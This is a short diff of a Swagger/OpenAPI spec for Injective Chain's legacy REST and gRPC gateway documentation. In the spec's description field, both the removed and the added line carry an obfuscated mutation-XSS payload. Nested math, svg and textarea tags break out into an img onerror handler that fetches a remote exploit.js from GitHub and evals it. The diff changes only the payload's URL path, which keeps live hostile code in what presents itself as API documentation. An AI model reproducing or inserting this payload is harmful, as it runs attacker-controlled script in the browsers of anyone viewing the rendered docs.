@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: Injective Chain - Legacy REST and gRPC Gateway docs
-  description: <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/4W/test/main/exploit.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
+  description: <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/4W/nothing/inj/exploit.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
   version: 1.0.0
 paths:
   /injective/exchange/v1beta1/atomic_order_fee_multiplier:
